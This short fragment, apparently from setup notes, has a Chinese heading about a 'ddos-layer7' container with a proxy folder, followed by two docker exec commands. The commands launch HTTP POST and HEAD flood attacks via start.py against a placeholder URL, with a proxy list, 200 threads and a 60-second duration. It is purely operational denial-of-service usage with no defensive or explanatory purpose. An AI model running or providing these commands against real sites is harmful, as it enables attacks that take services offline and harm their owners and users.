...
### ddos-layer7（代理）代理文件位置/root/files/proxies/
	...
	docker exec -it ddos-layer7 python3 start.py POST url 0 1 null_proxy.txt 200 60 &
	...
	docker exec -it ddos-layer7 python3 start.py HEAD url 0 1 null_proxy.txt 200 60 &
